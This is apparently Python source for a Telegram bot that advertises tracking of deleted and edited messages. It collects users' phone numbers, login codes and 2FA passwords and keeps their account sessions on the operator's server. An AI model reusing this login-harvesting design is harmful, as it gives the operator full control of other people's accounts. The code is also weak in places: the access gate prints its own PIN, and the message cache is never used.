import os
import asyncio
import logging
from datetime import datetime
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
from telethon.tl.custom import Button
import nest_asyncio

nest_asyncio.apply()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')

bot = TelegramClient('bot', API_ID, API_HASH)

# Хранилище сессий пользователей
user_sessions = {}  # {user_id: {'phone': '...', 'client': ..., 'step': '...'}}
authorized_users = set()
ACCESS_PIN = "5482"
message_cache = {}

@bot.on(events.NewMessage)
async def handler(event):
    user_id = event.sender_id
    text = event.message.text.strip()

    # === ПИН-КОД ===
    if user_id not in authorized_users:
        if text == ACCESS_PIN:
            authorized_users.add(user_id)
            await event.reply("✅ **Пин-код верный!** Используй /start")
        else:
            await event.reply("🔐 **Введите пин-код:**\n`5482`")
        return

    # === МЕНЮ ===
    if text == "/start":
        await event.reply(
            "👋 **Добро пожаловать!**\n\n"
            "1️⃣ Введите номер телефона\n"
            "2️⃣ Введите код из Telegram\n"
            "3️⃣ Начнётся мониторинг",
            buttons=[[Button.text("📞 Войти по номеру", resize=True)]]
        )
        return

    # === ЗАПРОС НОМЕРА ===
    if text == "📞 Войти по номеру":
        user_sessions[user_id] = {'step': 'waiting_phone'}
        await event.reply("📞 **Введите номер в формате:**\n`+79001234567`")
        return

    # === ПОЛУЧЕНИЕ НОМЕРА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_phone':
        phone = text
        user_sessions[user_id]['phone'] = phone
        user_sessions[user_id]['step'] = 'waiting_code'
        
        # Создаём клиента Telegram
        client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
        await client.connect()
        
        try:
            sent = await client.send_code_request(phone)
            user_sessions[user_id]['client'] = client
            user_sessions[user_id]['code_hash'] = sent.phone_code_hash
            await event.reply("✅ **Код отправлен!**\n\n✍️ Введи 5-значный код:")
        except Exception as e:
            await event.reply(f"❌ Ошибка: {e}")
            del user_sessions[user_id]
        return

    # === ПРОВЕРКА КОДА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_code':
        code = text.strip()
        session = user_sessions[user_id]
        client = session['client']
        
        try:
            await client.sign_in(session['phone'], code, phone_code_hash=session['code_hash'])
            me = await client.get_me()
            
            await event.reply(
                f"✅ **Успешный вход!**\n\n"
                f"👤 Аккаунт: @{me.username}\n"
                f"🆔 ID: {me.id}\n\n"
                f"🔍 **Мониторинг запущен!**"
            )
            
            del user_sessions[user_id]
            asyncio.create_task(monitor_user_chats(user_id, client))
            
        except SessionPasswordNeededError:
            user_sessions[user_id]['step'] = 'waiting_2fa'
            await event.reply("🔐 **Требуется пароль 2FA.**\nВведи его:")
        except PhoneCodeInvalidError:
            await event.reply("❌ **Неверный код!**\nПопробуй ещё раз:")
        except PhoneCodeExpiredError:
            await event.reply("⌛ **Код истёк.**\nНажми /start и попробуй снова.")
        except Exception as e:
            await event.reply(f"❌ Ошибка: {e}")
            del user_sessions[user_id]
        return

    # === 2FA ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_2fa':
        password = text
        session = user_sessions[user_id]
        client = session['client']
        
        try:
            await client.sign_in(password=password)
            me = await client.get_me()
            await event.reply(f"✅ **Вход выполнен!**\n👤 Аккаунт: @{me.username}")
            del user_sessions[user_id]
            asyncio.create_task(monitor_user_chats(user_id, client))
        except Exception as e:
            await event.reply(f"❌ Ошибка: {e}")

# === МОНИТОРИНГ ===
async def monitor_user_chats(user_id, client):
    await bot.send_message(user_id, "🔍 **Мониторинг запущен!**")
    
    @client.on(events.MessageDeleted)
    async def on_delete(event):
        for msg_id in event.deleted_ids:
            await bot.send_message(user_id, f"🗑 **Удалено:** {msg_id}")
    
    @client.on(events.MessageEdited)
    async def on_edit(event):
        await bot.send_message(user_id, f"✏️ **Изменено:** {event.message.text}")
    
    await client.run_until_disconnected()

async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"✅ Бот @{me.username} запущен! Пин-код: 5482")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())